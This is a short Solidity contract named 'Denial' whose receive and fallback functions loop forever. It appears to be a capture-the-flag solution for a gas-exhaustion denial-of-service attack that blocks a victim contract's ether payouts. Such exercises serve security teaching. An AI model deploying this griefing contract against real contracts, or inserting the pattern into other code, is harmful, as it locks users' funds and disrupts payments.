// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    receive() external payable { 
		while (true) {}
	}
	
    fallback() external payable { 
		while (true) {}
	}
}
